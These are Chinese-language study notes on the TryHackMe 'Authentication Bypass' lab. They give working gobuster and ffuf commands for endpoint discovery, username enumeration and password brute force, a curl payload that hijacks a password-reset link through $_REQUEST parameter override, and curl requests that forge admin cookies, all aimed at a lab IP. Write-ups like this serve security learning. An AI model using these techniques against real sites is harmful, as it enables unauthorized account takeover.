# TryHackMe - Authentication Bypass 实战笔记

## 前言

- **靶机名称**：Authentication Bypass (认证绕过)
- **难度**：Easy (高级客房)
- **目标**：学习如何破解、绕过或篡改网站的身份认证机制，获取未授权访问权限。
- **环境**：Kali 攻击机 + THM 靶机（IP：`10.48.157.163`）

---

# 信息收集与枚举

### 目录/端点探测 (gobuster)

**知识点摘要**  
在渗透测试初期，找出未公开的页面（如后台、登录、API）至关重要。

```bash
gobuster dir -u "http://10.48.157.163/customers/" -w /usr/share/wordlists/dirb/common.txt
```

**扫描结论**

- `account` (302)：需要登录的个人账户页。
- `login` (200)：登录页面。
- `logout` (302)：退出登录。
- `signup` (200)：注册页面。
- `tickets` (302)：**需要登录才能访问的工单系统，重点目标**。

> **避坑点**：发现 `/login` 后，不要用 `gobuster` 继续扫 `/login/` 目录，因为它是个文件端点，不是目录。应该去测它的参数。

### 用户名枚举 (ffuf)

**知识点摘要**  
利用注册接口（`/customers/signup`）的报错信息差异，枚举系统内已存在的用户。

- `-mr` (Match Regex)：**保留**包含指定字符串的响应。

```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
     -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://10.48.157.163/customers/signup \
     -mr "username already exists"
```

**枚举结果**：`admin`, `robert`, `simon`, `steve`。

# 密码爆破

### 双字典笛卡尔积爆破 (ffuf)

**知识点摘要**  
使用用户名和密码两个字典进行交叉匹配爆破。

- `-w W1, W2`：指定多个字典，并命名占位符。
- `-fc 200` (Filter Code)：**丢弃**状态码为 200 的响应（这是登录失败的页面），保留 302 成功跳转。

```bash
ffuf -w username.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt:W2 \
     -X POST -d "username=W1&password=W2" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://10.48.157.163/customers/login \
     -fc 200
```

**爆破结果**：`steve` : `thunder`（状态码 302）。

# Web 逻辑漏洞利用

### 逻辑缺陷 - 密码重置劫持 (Logic Flaw)

**漏洞根源**  
密码重置接口用 `$_REQUEST` 取收件人。PHP 的 `$_REQUEST` 优先读取 POST 数据，导致攻击者可以通过在 POST 体里加 `email` 参数，覆盖掉 URL 里的正常邮箱，实现重置链接劫持。

**前置操作**  
先去 `/customers/signup` 注册自己的账号，获取靶机内专属邮箱（如 `redteam@customer.acmeitsupport.thm`）。

**构造 Payload**  
利用 `curl` 发送 GET 请求（URL 带 robert 邮箱骗过前端），同时发送 POST 数据（带攻击者邮箱）。


```bash
curl 'http://10.48.157.163/customers/reset?email=robert%40acmeitsupport.thm' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=robert&email=redteam@customer.acmeitsupport.thm'
```

**利用过程**

1. 回显显示 `We'll send you a reset email to redteam...`，说明劫持成功。
2. 登录自己的 `redteam` 账号，进入 `tickets` 工单系统。
3. 看到 `Password Reset` 的工单，里面有 `http://.../customers/reset/51e11e...` 的链接。
4. 浏览器访问该链接，**成功以 robert 身份登录**。
5. 查看 robert 的工单，拿到 Flag。

# Cookie 篡改越权

### 客户端权限伪造 (Cookie Tampering)

**知识点摘要**  
后端依赖未加密且未签名的 Cookie 进行权限校验。


```text
# 1. 裸访问（未登录）
curl http://10.48.157.163/cookie-test
# 结果：Not Logged In
# 2. 伪造普通用户
curl -H "Cookie: logged_in=true; admin=false" http://10.48.157.163/cookie-test
# 结果：Logged In As A User
# 3. 伪造管理员（越权）
curl -H "Cookie: logged_in=true; admin=true" http://10.48.157.163/cookie-test
# 结果：Logged In As An Admin - THM{COOKIE_TAMPERING}
```

**实战延伸**  
在真实浏览器中，按 `F12` -> `Application` -> `Cookies` 直接改值，刷新页面即可越权。

# 核心工具箱 (Cheat Sheet)

|工具/参数|适用场景|核心用法|
|---|---|---|
|**`ffuf -mr`**|匹配内容（正向保留）|`-mr "welcome admin"`|
|**`ffuf -fr`**|过滤内容（反向丢弃）|`-fr "invalid password"`|
|**`ffuf -fc`**|过滤状态码（反向丢弃）|`-fc 200`（丢掉失败页，留 302）|
|**`ffuf -fs`**|过滤响应大小|`-fs 1234`（丢掉默认的固定页面大小）|
|**`gobuster dir`**|目录与端点发现|`-u URL -w 字典 -x php,html`|
|**`curl -d`**|发送 POST 表单数据|`-d "user=admin&pass=123"`|
|**`curl -H`**|伪造请求头|`-H "Cookie: admin=true"`|

# 总结

这个靶场虽然简单，但非常经典。它涵盖了 Web 渗透中最基础也最致命的三大认证缺陷：

1. **信息泄露**（注册报错导致用户名泄露）
2. **暴力破解**（无验证码/频率限制导致密码被爆）
3. **业务逻辑漏洞**（`$_REQUEST` 变量覆盖）
4. **客户端信任问题**（Cookie 篡改）
